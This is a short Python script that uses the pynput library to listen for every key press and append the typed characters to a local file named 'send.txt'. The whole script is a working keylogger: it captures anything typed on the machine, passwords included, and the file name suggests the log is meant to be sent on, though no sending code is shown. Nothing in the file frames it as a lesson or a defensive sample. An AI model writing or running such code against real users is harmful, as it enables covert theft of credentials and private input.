from pynput import keyboard

def keyPress(key):
    file = open("send.txt","a")
    try:
        file.write(key.char)
    except AttributeError:
        file.write("\n{0}\n".format(key))

# Collect events until released
with keyboard.Listener(on_press=keyPress) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(on_press=keyPress)
listener.start()